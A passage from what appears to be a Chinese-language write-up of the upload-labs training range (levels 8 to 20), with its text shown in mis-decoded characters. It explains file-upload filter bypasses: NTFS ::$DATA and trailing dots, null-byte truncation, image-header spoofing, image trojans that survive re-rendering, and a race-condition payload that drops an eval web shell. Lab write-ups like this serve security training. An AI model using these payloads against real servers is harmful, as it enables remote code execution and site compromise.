src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154001285.png" alt="image-20210916154001285"></p><p>æ–‡ä»¶æœ«å°¾åŠ ç‚¹ç»•è¿‡ï¼Œä»¥ä¸º Windows å¯¹æ–‡ä»¶çš„è§£æç‰¹æ€§ï¼ŒWindows ä¼šå¯¹æ–‡ä»¶æœ«å°¾çš„<code>.</code> è‡ªåŠ¨å¿½ç•¥</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>ç¦æ­¢äº†ä¸€å¤§å †æ–‡ä»¶åç¼€</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154257014.png" alt="image-20210916154257014"></p><blockquote><p>å’Œä¹‹å‰ç›¸æ¯”å°‘äº†å»é™¤ ::$DATA è¿™ä¸€æ­¥</p></blockquote><p>æ–‡ä»¶ååé¢æ·»åŠ  <code>::$DATA</code> å®ç°ç»•è¿‡</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154718353.png" alt="image-20210916154718353"></p><blockquote><p>è¿™ä¸ªä¹Ÿæ˜¯ Windows çš„ç‰¹æ€§</p></blockquote><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916155134664.png" alt="image-20210916155134664"></p><p>è¿™æ¬¡ä½¿ç”¨çš„æ˜¯ç™½åå•</p><p><img src="D:\markdown\image-20210916160139526.png" alt="image-20210916160139526"></p><p>ä¸Šä¼ åç¼€ <code>shell.php. .</code></p><p>åŸç†å°±æ˜¯ï¼šé¦–å…ˆä¼šæ¶ˆé™¤æ–‡ä»¶åçš„ç©ºï¼Œç„¶åå»é™¤æ‰æœ€åä¸€ä¸ªç‚¹ï¼Œæœ€åå†æ¶ˆé™¤æœ«å°¾çš„ç©ºï¼Œè¿™æ ·å°±å˜æˆäº†<code>shell.php.</code> æˆåŠŸç»•è¿‡æ£€æŸ¥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160336188.png" alt="image-20210916160336188"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160745954.png" alt="image-20210916160745954"></p><blockquote><p>å¥½å®¶ä¼™å…¨ç»™å»é™¤äº†</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160814358.png" alt="image-20210916160814358"></p><p>åŒå†™ç»•è¿‡</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161037159.png" alt="image-20210916161037159"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161154457.png" alt="image-20210916161154457"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161213142.png" alt="image-20210916161213142"></p><p>è¿™é‡Œæ˜¯ä½¿ç”¨ <code>%00</code> æˆªæ–­ç»•è¿‡</p><ul><li>PHP ç‰ˆæœ¬ &lt; 5.3.4</li><li>PHP çš„é­”æœ¯å¼•å·å³ <code>magic_quotes_gpc</code> ä¸º OFF å…³é—­çŠ¶æ€</li></ul><blockquote><p>æœ¬åœ°ç¯å¢ƒä¸åˆé€‚æ‰€ä»¥å°±ç®€å•å†™ä¸€ä¸‹æ“ä½œè¿‡ç¨‹</p></blockquote><p>å°†ä¸Šä¼ æ–‡ä»¶çš„ç›®çš„åœ°å€å†™ä¸º<code>../upload/shell.php%00</code></p><p>ä¸Šä¼ çš„æ–‡ä»¶ä¸º<code>test.jpg</code></p><p>æœ€åä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ç»“æœå°±æ˜¯ <code>../upload/shell.php%00/test.jpg</code> é›ªèŒ¹æ–‡ä»¶æ—¶ï¼Œå‡½æ•°è¯»åˆ° <code>%00</code> å°±ä¼šå½“æˆç»“æŸç¬¦è€ŒæŠŠåé¢å­—ç¬¦çš„ç›´æ¥å¿½ç•¥æ‰ï¼Œè¿™æ ·å°±ä¼šç›´æ¥ç”Ÿæˆä¸€ä¸ª <code>../upload/shell.php</code> æ–‡ä»¶</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>åˆ©ç”¨ <code>0x00</code> æˆªæ–­ç»•è¿‡ï¼Œ<code>%00</code> ä¸ <code>0x00</code> çš„åŒºåˆ«å°±æ˜¯ <code>%00</code> æˆªæ–­æ˜¯URLç¼–ç çš„è¡¨ç°ï¼Œç”¨äº GET æ–¹æ³• <code>0x00</code>æˆªæ–­æ˜¯äºŒè¿›åˆ¶ç¼–ç çš„è¡¨ç°ï¼Œç”¨æˆ·POSTæ–¹æ³•ã€‚ç”±äºPOSTä¸ä¼šåƒ GET ä¸€æ ·è‡ªåŠ¨å¯¹URLè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ HEX ä¸­ç›´æ¥è¿›è¡ŒäºŒè¿›åˆ¶ä¿®æ”¹ä¸º 00</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916162855128.png" alt="image-20210916162855128"></p><p>ç›´æ¥ä¿®æ”¹æ·»åŠ æ–‡ä»¶å¤´å³å¯ç»•è¿‡æ£€æŸ¥ï¼Œæ·»åŠ  <code>GIF89A</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163149385.png" alt="image-20210916163149385"></p><p>å›¾ç‰‡é©¬çš„åˆ¶ä½œ</p><ul><li>GIF ç›´æ¥æ·»åŠ  GIF89a</li><li>JPG å‡†å¤‡ä¸€å¥è¯æœ¨é©¬å’Œä¸€ä¸ªjpgå›¾ç‰‡ <code> copy 1.jpg /b + 2.php /a  shell.jpg</code> å³å¯ç”Ÿæˆ</li><li>PNG ä¸ä¸Šé¢ç±»ä¼¼</li></ul><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163920293.png" alt="image-20210916163920293"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163934575.png" alt="image-20210916163934575"></p><blockquote><p>éœ€è¦åˆ¶ä½œä¸€ä¸ªé«˜ä»¿çš„å›¾ç‰‡ç </p></blockquote><p><img src="D:\markdown\image-20210916164251000.png" alt="image-20210916164251000"></p><blockquote><p>çº¸è€è™ï¼Œè¿™éƒ½æ‹¦ä¸ä½</p></blockquote><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916164341948.png" alt="image-20210916164341948"></p><p>ç›´æ¥æ·»åŠ  <code>GIF89a</code> ä¸èƒ½ç»•è¿‡äº†</p><p><code>exif_imagetype()</code> è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</p><p>çœ‹æ¥å¿…é¡»æ­£å„¿å…«ç»çš„åšä¸€ä¸ªå›¾ç‰‡é©¬äº†ï¼Œä½¿ç”¨ copy å‘½ä»¤åˆ¶ä½œä¸€ä¸ªå›¾ç‰‡é©¬ä¸Šä¼ å³å¯</p><blockquote><p>é¶åœºå‡ºé—®é¢˜äº†ï¼Œæ­£å¸¸å›¾ç‰‡éƒ½ä¸èƒ½ä¸Šä¼ </p></blockquote><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916165351432.png" alt="image-20210916165351432"></p><blockquote><p>äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</p></blockquote><p><code>imagecreatefromjpeg()</code> ç”±æ–‡ä»¶æˆ–URLåˆ›å»ºä¸€ä¸ªæ–°å›¾è±¡</p><p>ä¸¥æ ¼åˆ¤æ–­æ–‡ä»¶åç¼€æ˜¯å¦åˆæ³•ï¼Œå¹¶ä¸” Content-Type æ˜¯å¦ä¸ºå¯¹åº”çš„å›¾åƒç±»å‹ï¼Œæœ€åè°ƒç”¨<code> imagecreatefromjpeg()</code> ç­‰å‡½æ•°å¯¹å›¾åƒè¿›è¡ŒäºŒæ¬¡ç¼–è¯‘å³è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ã€‚ç»•è¿‡çš„æ–¹æ³•ï¼šåŒæ ·ä½¿ç”¨å›¾ç‰‡æœ¨é©¬ä¸Šä¼ ï¼Œä½†æ˜¯éœ€è¦å¯¹å›¾åƒæœªè¿›è¡ŒäºŒæ¬¡ç¼–è¯‘çš„ä½ç½®è¿›è¡Œåˆ†æï¼Œå†å¾€è¯¥ä½ç½®æ’å…¥æ¶æ„ PHP ä»£ç ï¼Œä¸åŒçš„å›¾åƒç±»å‹æ’å…¥çš„æ–¹å¼æœ‰åŒºåˆ«</p><blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯æ¯”è¾ƒä¸Šä¼ å‰åå›¾ç‰‡æ²¡æœ‰å˜çš„ä½ç½®ï¼Œåœ¨æ²¡æœ‰æ”¹å˜çš„åœ°æ–¹æ’å…¥æœ¨é©¬åé—¨</p></blockquote><p>PNG</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$p = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br>$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> ($y = <span class="hljs-number">0</span>; $y &lt; sizeof($p); $y += <span class="hljs-number">3</span>) &#123;<br>   $r = $p[$y];<br>   $g = $p[$y+<span class="hljs-number">1</span>];<br>   $b = $p[$y+<span class="hljs-number">2</span>];<br>   $color = imagecolorallocate($img, $r, $g, $b);<br>   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color);<br>&#125;<br><br>imagepng($img,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œä¸Šé¢è„šæœ¬ç›´æ¥ç”Ÿæˆå›¾ç‰‡ï¼Œä¸Šä¼ å³å¯</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916170941448.png" alt="image-20210916170941448"></p><blockquote><p>è¿˜æœ‰å…¶ä»–çš„å›¾ç‰‡æœ¨é©¬ç”Ÿæˆæ–¹æ³•ï¼Œè¿™é‡Œå°±æ²¡æœ‰ä¸€ä¸€å°è¯•äº†</p></blockquote><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916171133418.png" alt="image-20210916171133418"></p><p>è¿™é‡Œçš„æ£€æŸ¥æ–¹æ³•æ˜¯ç”¨æˆ·æ–‡ä»¶å…ˆä¸Šä¼ åˆ°æ–‡ä»¶ç›®å½•ä¹‹åï¼Œå†æ£€æŸ¥æ˜¯å¦åˆæ³•å¹¶æ‰§è¡Œåˆ é™¤æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰çš„æ–¹æ³•ä¸Šä¼ æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>; fputs(fopen(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo(); @eval($_GET[c]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ burp ä¸€è¾¹ä¸Šä¼ ï¼Œç„¶åä½¿ç”¨ python è„šæœ¬æŒç»­è®¿é—®ï¼Œä¸Šä¼ æˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916172537339.png" alt="image-20210916172537339"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    $imgFileName =time();<br>    $u = <span class="hljs-keyword">new</span> MyUpload($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],$imgFileName);<br>    $status_code = $u-&gt;upload(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> ($status_code) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            $is_upload = <span class="hljs-literal">true</span>;<br>            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            $msg = <span class="hljs-string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>            $msg = <span class="hljs-string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-2</span>:<br>            $msg = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-3</span>:<br>            $msg = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-4</span>:<br>            $msg = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-5</span>:<br>            $msg = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-6</span>:<br>            $msg = <span class="hljs-string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            $msg = <span class="hljs-string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> $cls_arr_ext_accepted = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> $dir </span>)</span>&#123;<br>    <br>    $ret = <span class="hljs-keyword">$this</span>-&gt;isUploadedFile();<br>    <br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;setDir( $dir );<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkExtension();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkSize();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      $ret = <span class="hljs-keyword">$this</span>-&gt;checkFileExists();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;move();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      $ret = <span class="hljs-keyword">$this</span>-&gt;renameFile();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;;<br><br><br></code></pre></td></tr></table></figure><blockquote><p>æ¡ä»¶ç«äº‰ä¸è§£ææ¼æ´</p></blockquote><p>Apache1.xï¼Œ2.xä¸­Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å† php åéšä¾¿åŠ ä¸Šä¸€ä¸ªæ²¡æœ‰çš„åç¼€ï¼Œè¿™æ · Apache å°±å¯ä»¥è§£æäº†ï¼Œåœ¨æ–‡ä»¶é‡å‘½åå‰å°†è®¿é—®æ–‡ä»¶</p><p><a href="https://www.cnblogs.com/HelloCTF/p/13189084.html">https://www.cnblogs.com/HelloCTF/p/13189084.html</a></p><blockquote><p>è¿™ä¹ˆå¤šè¯·æ±‚è™šæ‹Ÿæœºæœ‰ç‚¹å—ä¸äº†ï¼ŒåŸç†æ–¹æ³•å°±æ˜¯è¿™æ ·</p></blockquote><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916174628402.png" alt="image-20210916174628402"></p><blockquote><p>å¬åˆ° POST å°±å¼€å§‹å¯¹ 0x00 æ•æ„Ÿäº†</p></blockquote><p>ç»•è¿‡æ–¹æ³•ï¼š</p><ul><li>ç‚¹ç»•è¿‡</li><li>::$DATA ç»•è¿‡</li><li>ç©ºæ ¼ç»•è¿‡</li><li>å¤§å°å†™ç»•è¿‡</li><li>Apache è§£ææ¼æ´ç»•è¿‡</li><li>0x00 æˆªæ–­ ï¼ˆç¯å¢ƒä¸æ”¯æŒï¼‰</li></ul><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175255368.png" alt="image-20210916175255368"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175230483.png" alt="image-20210916175230483"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175620779.png" alt="image-20210916175620779"></p><ul><li>æ£€æŸ¥äº† Content-Type</li><li>æ–‡ä»¶åç¼€</li></ul><p><code>explode(separator,string,limit)</code>å‡½æ•°ï¼Œä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ã€‚</p><p><code>end(array)</code>å‡½æ•°ï¼Œè¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ å’Œæœ€åä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚</p><p><code>reset(array)</code>å‡½æ•°ï¼ŒæŠŠæ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¿™ä¸ªå…ƒç´ çš„å€¼</p><p><code>count(array)</code>å‡½æ•°ï¼Œè®¡ç®—æ•°ç»„ä¸­çš„å•å…ƒæ•°ç›®ï¼Œæˆ–å¯¹è±¡ä¸­çš„å±æ€§ä¸ªæ•°</p><p>åŸç†ç®€å•ï¼Œä¸è¿‡å¤šå†™äº†ã€‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916180803908.png" alt="image-20210916180803908"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916180939375.png" alt="image-20210916180939375"></p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://fuping.site/2018/06/04/upload-labs-writeup/">https://fuping.site/2018/06/04/upload-labs-writeup/</a></p><p><a 